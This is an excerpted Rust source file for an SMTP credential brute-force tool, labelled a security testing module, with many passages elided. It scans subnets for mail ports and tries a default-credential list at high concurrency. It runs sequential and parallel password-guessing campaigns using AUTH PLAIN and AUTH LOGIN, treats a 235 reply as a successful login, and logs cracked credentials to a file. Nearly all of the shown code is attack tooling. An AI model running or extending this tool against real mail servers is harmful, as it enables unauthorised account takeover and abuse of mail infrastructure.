...
const DEFAULT_SMTP_PORTS: &[u16] = &[25, 587, 465];
...
async fn run_sequential_bruteforce(targets: Vec<String>, base_config: SmtpBruteforceConfig) -> Result<()> {
    for (idx, target) in targets.iter().enumerate() {
        println!("\n{}", format!("=== Target {}/{}: {} ===", idx + 1, targets.len(), target).bright_cyan());
        let mut config = base_config.clone();
        config.target = target.clone();

        if let Err(e) = run_smtp_bruteforce(config).await {
...
async fn run_parallel_bruteforce(targets: Vec<String>, base_config: SmtpBruteforceConfig) -> Result<()> {
    ...
    for target in targets {
        ...
        let task = tokio::spawn(async move {
            ...
            run_smtp_bruteforce(target_config).await
        });
...
async fn run_batch_scanner(target: &str) -> Result<()> {
    ...
    let mut config = BatchScanConfig {
        targets: Vec::new(),
        ports: DEFAULT_SMTP_PORTS.to_vec(),
        ...
        max_concurrent: 50,
        output_file: "smtp_scan_results.txt".to_string(),
        verbose: false,
    };
    ...
    if prompt_yes_no("Use default ports (25, 587, 465)? (y/n): ", true) {
        config.ports = DEFAULT_SMTP_PORTS.to_vec();
    } else {
...
async fn run_quick_check(target: &str, is_subnet: bool) -> Result<()> {
    ...
    let port: u16 = prompt_required("Port (default 25): ")
        .parse()
        .unwrap_or(25);
    ...
    for target_ip in targets {
        ...
        for (username, password) in DEFAULT_CREDENTIALS {
            match try_smtp_login_simple(&target_ip, port, username, password, 3).await {
                Ok(true) => {
                    let result = format!("{}:{} - {}/{}",
...
async fn run_smtp_bruteforce(config: SmtpBruteforceConfig) -> Result<()> {
    ...
    if config.pre_validate {
        println!("[*] Validating target is SMTP service...");
        match validate_smtp_target(&addr, &config).await {
...
async fn try_smtp_login(addr: &str, username: &str, password: &str, config: &SmtpBruteforceConfig) -> Result<bool> {
    ...
    for _ in 0..6 {
        ...
        if s.contains("AUTH") && s.contains("PLAIN") {
            plain_ok = true;
        }
    ...
    // Try AUTH PLAIN
    if plain_ok && (config.auth_methods.is_empty() || config.auth_methods.iter().any(|m| m.eq_ignore_ascii_case("PLAIN"))) {
        let mut blob = vec![0];
        blob.extend(username.as_bytes());
        blob.push(0);
        blob.extend(password.as_bytes());
        ...
        for _ in 0..2 {
            ...
            let s = String::from_utf8_lossy(&buf[..n]);
            if s.starts_with("235") {
                writer.write_all(b"QUIT\r\n").await.ok();
                return Ok(true);
            }
            if s.starts_with("535") || s.starts_with("5") {
                break;
            }
        }
    }
    ...
    // Try AUTH LOGIN
    if login_ok && (config.auth_methods.is_empty() || config.auth_methods.iter().any(|m| m.eq_ignore_ascii_case("LOGIN"))) {
        ...
        writer.write_all(ucmd.as_bytes()).await?;
        writer.flush().await?;
        ...
        writer.write_all(pcmd.as_bytes()).await?;
        writer.flush().await?;
...
async fn try_smtp_login_simple(
    ip: &str,
    port: u16,
    username: &str,
    password: &str,
    ...
    // Send EHLO
    stream.write_all(b"EHLO scanner\r\n").await?;
    stream.flush().await?;
...
fn spawn_worker(
    ...
    tokio::spawn(async move {
        loop {
            ...
            let mut attempt_result = try_smtp_login(&addr, &user, &pass, &config).await;
            ...
            while config.retry_on_error && retry_count < config.max_retries && attempt_result.is_err() {
                ...
                attempt_result = try_smtp_login(&addr, &user, &pass, &config).await;
            }
...
async fn initialize_output_file(output_file: &str, config: &SmtpBruteforceConfig) -> Result<()> {
    if !config.append_mode {
        let mut f = File::create(output_file).await?;
        f.write_all(format!("# SMTP Results - {}\n", chrono::Local::now()).as_bytes()).await?;
...
async fn validate_smtp_target(addr: &str, config: &SmtpBruteforceConfig) -> Result<()> {
    let socket = addr.to_socket_addrs()?.next().ok_or_else(|| anyhow!("Cannot resolve"))?;
    ...
    match timeout(Duration::from_secs(config.read_timeout), stream.read(&mut buf)).await {
        Ok(Ok(n)) if n > 0 => {
            ...
            if response.starts_with("220") {
                ...
                Err(anyhow!("No SMTP banner (220) detected"))
            }
        }
...
async fn execute_batch_scan(config: BatchScanConfig) -> Result<()> {
    ...
    println!("Open SMTP ports:       {}", open_ports);
...
async fn scan_target(ip: String, config: &BatchScanConfig) -> Vec<ScanResult> {
    ...
    for &port in &config.ports {
        ...
        for (username, password) in &config.credentials {
            ...
            match try_smtp_login_simple(&ip, port, username, password,
...
async fn build_interactive_config(target: &str) -> Result<SmtpBruteforceConfig> {
    println!();
    ...
    let use_custom_auth = prompt_yes_no("Use custom auth methods? (y/n): ", false);
    let auth_methods = if use_custom_auth {
        prompt_list("Auth methods (comma-separated, e.g. PLAIN,LOGIN): ")
    } else {
        Vec::new()
    };

    Ok(SmtpBruteforceConfig {
...
async fn load_and_validate_config(path: &str, target: &str) -> Result<SmtpBruteforceConfig> {
    let content = tokio::fs::read_to_string(path).await?;
    let mut config: SmtpBruteforceConfig = serde_json::from_str(&content)?;
...
async fn save_config(config: &SmtpBruteforceConfig, path: &str) -> Result<()> {
    let json = serde_json::to_string_pretty(config)?;
    tokio::fs::write(path, json).await?;
    Ok(())
}

fn print_config_summary(config: &SmtpBruteforceConfig) {
...
fn display_banner() {
    println!();
    println!("{}", "╔══════════════════════════════════════════════╗".bright_cyan());
    println!("{}", "║   SMTP SECURITY TESTING MODULE               ║".bright_cyan());
